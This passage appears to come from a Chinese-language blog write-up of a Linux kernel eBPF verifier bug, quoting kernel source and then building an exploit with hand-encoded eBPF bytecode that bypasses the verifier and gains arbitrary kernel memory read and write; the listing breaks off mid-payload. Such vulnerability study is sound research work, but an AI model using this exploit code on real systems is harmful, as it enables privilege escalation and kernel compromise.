class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line"><span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line"><span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">[BPF_ALU | BPF_ADD | BPF_X] = &amp;&amp;ALU_ADD_X,</span><br><span class="line">[BPF_ALU | BPF_ADD | BPF_K] = &amp;&amp;ALU_ADD_K,</span><br><span class="line">[BPF_ALU | BPF_SUB | BPF_X] = &amp;&amp;ALU_SUB_X,</span><br><span class="line">[BPF_ALU | BPF_SUB | BPF_K] = &amp;&amp;ALU_SUB_K,</span><br><span class="line">[BPF_ALU | BPF_AND | BPF_X] = &amp;&amp;ALU_AND_X,</span><br><span class="line">[BPF_ALU | BPF_AND | BPF_K] = &amp;&amp;ALU_AND_K,</span><br><span class="line">[BPF_ALU | BPF_OR | BPF_X]  = &amp;&amp;ALU_OR_X,</span><br><span class="line">[BPF_ALU | BPF_OR | BPF_K]  = &amp;&amp;ALU_OR_K,</span><br><span class="line">[BPF_ALU | BPF_LSH | BPF_X] = &amp;&amp;ALU_LSH_X,</span><br><span class="line">[BPF_ALU | BPF_LSH | BPF_K] = &amp;&amp;ALU_LSH_K,</span><br><span class="line">[BPF_ALU | BPF_RSH | BPF_X] = &amp;&amp;ALU_RSH_X,</span><br><span class="line">[BPF_ALU | BPF_RSH | BPF_K] = &amp;&amp;ALU_RSH_K,</span><br><span class="line">[BPF_ALU | BPF_XOR | BPF_X] = &amp;&amp;ALU_XOR_X,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到函数这里维护的是一个跳表，根据opcode来进行跳转，并且没有任何检测。这里重点关注一下上述例子中的跳转函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Jumps */</span></span><br><span class="line">[BPF_JMP | BPF_JA] = &amp;&amp;JMP_JA,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_X] = &amp;&amp;JMP_JEQ_X,</span><br><span class="line">[BPF_JMP | BPF_JEQ | BPF_K] = &amp;&amp;JMP_JEQ_K,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_X] = &amp;&amp;JMP_JNE_X,</span><br><span class="line">[BPF_JMP | BPF_JNE | BPF_K] = &amp;&amp;JMP_JNE_K,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_X] = &amp;&amp;JMP_JGT_X,</span><br><span class="line">[BPF_JMP | BPF_JGT | BPF_K] = &amp;&amp;JMP_JGT_K,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_X] = &amp;&amp;JMP_JGE_X,</span><br><span class="line">[BPF_JMP | BPF_JGE | BPF_K] = &amp;&amp;JMP_JGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_X] = &amp;&amp;JMP_JSGT_X,</span><br><span class="line">[BPF_JMP | BPF_JSGT | BPF_K] = &amp;&amp;JMP_JSGT_K,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_X] = &amp;&amp;JMP_JSGE_X,</span><br><span class="line">[BPF_JMP | BPF_JSGE | BPF_K] = &amp;&amp;JMP_JSGE_K,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_X] = &amp;&amp;JMP_JSET_X,</span><br><span class="line">[BPF_JMP | BPF_JSET | BPF_K] = &amp;&amp;JMP_JSET_K,</span><br></pre></td></tr></table></figure><p>可以看到这里赋值的是<code>JMP_JNE_K</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line"><span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">  insn += insn-&gt;off;</span><br><span class="line">  CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure><p>这里就比较关注DST和IMM的定义了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Named registers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSTregs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRCregs[insn-&gt;src_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FPregs[BPF_REG_FP]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARG1regs[BPF_REG_ARG1]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CTXregs[BPF_REG_CTX]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMMinsn-&gt;imm</span></span><br></pre></td></tr></table></figure><p>可以看到这里IMM的定义依旧是从insn中拿出来的，然而这里的DST是直接从约定的寄存器中拿出来，然而在<code>__bpf_prog_run</code>函数的开头可以看出来这里的寄存器定义为<code>unsigned long long int</code>类型，那么如果重新执行上述演示代码就会出现跳转，也就是说检查和实际运行的指令执行流程会不一致，可以利用这个绕过安全检测。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="退出do-check"><a href="#退出do-check" class="headerlink" title="退出do_check"></a>退出<code>do_check</code></h3><p>但就目前来看依旧存在的一个问题就是虽然他会进入<code>BPF_EXIT</code>分支，但是在最后的pop_stack需要返回的值为负数才能结束循环退出<code>do_check</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">  <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">      insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">      insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">      insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment"> * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment"> * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment"> * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment"> * something into it earlier</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EACCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process_bpf_exit:</span><br><span class="line">  insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">  <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_print_state = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(struct verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">elem</span>;</span></span><br><span class="line"><span class="keyword">int</span> insn_idx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</span><br><span class="line">insn_idx = env-&gt;head-&gt;insn_idx;</span><br><span class="line"><span class="keyword">if</span> (prev_insn_idx)</span><br><span class="line">*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</span><br><span class="line">elem = env-&gt;head-&gt;next;</span><br><span class="line">kfree(env-&gt;head);</span><br><span class="line">env-&gt;head = elem;</span><br><span class="line">env-&gt;stack_size--;</span><br><span class="line"><span class="keyword">return</span> insn_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span><span class="comment">/* eBPF program being verified */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">head</span>;</span> <span class="comment">/* stack of verifier states to be processed */</span></span><br><span class="line"><span class="keyword">int</span> stack_size;<span class="comment">/* number of states to be processed */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> <span class="title">cur_state</span>;</span> <span class="comment">/* current verifier state */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_state_list</span> **<span class="title">explored_states</span>;</span> <span class="comment">/* search pruning optimization */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">used_maps</span>[<span class="title">MAX_USED_MAPS</span>];</span> <span class="comment">/* array of map&#x27;s used by eBPF program */</span></span><br><span class="line">u32 used_map_cnt;<span class="comment">/* number of used maps */</span></span><br><span class="line"><span class="keyword">bool</span> allow_ptr_leaks;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们在实现构造时需要将head位置为0，根据函数名<code>pop_stack</code>可以推测出来这里其实也就是栈的操作，所以大致的构造方法是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN(),</span><br><span class="line">option,</span><br><span class="line">pandding == <span class="number">0</span>,</span><br><span class="line">options</span><br></pre></td></tr></table></figure><h3 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h3><p>内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment"> * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                         insn-&gt;dst_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment"> * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment"> * use reserved &#x27;imm&#x27; field to mark this insn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    <span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment"> * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment"> * with different pointer types:</span></span><br><span class="line"><span class="comment"> * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment"> * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment"> * Reject it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">    err = check_xadd(env, insn);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src1 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  <span class="comment">/* check src2 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                         insn-&gt;src_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    insn-&gt;imm = dst_reg_type;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_mem_access</code>函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。所以这里使用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。</p><p>最终构造的eBPF指令为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------part <span class="number">1</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/* BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),              r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),    if (r9 == -1) &#123;        */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                         exit(0);             */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN()                                                            */</span></span><br><span class="line">----------------------------------------------part <span class="number">2</span> ----------------------------------------------</span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">----------------------------------------------part <span class="number">3</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map中Key值为0的value值存放到reg_6</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">12.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">13.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = 0 */</span></span><br><span class="line"><span class="number">14.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),           */</span></span><br><span class="line"><span class="number">15.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">16.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">17.</span> <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">4</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(1, BPF_REG_7)  r7=address,取map中Key值为1的value值存放到reg_7</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">21.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">22.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">23.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">24.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = 1 */</span></span><br><span class="line"><span class="number">25.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),          */</span></span><br><span class="line"><span class="number">26.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">27.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">28.</span> <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">5</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map中Key值为2的value值存放到reg_8</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">32.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">33.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">34.</span> <span 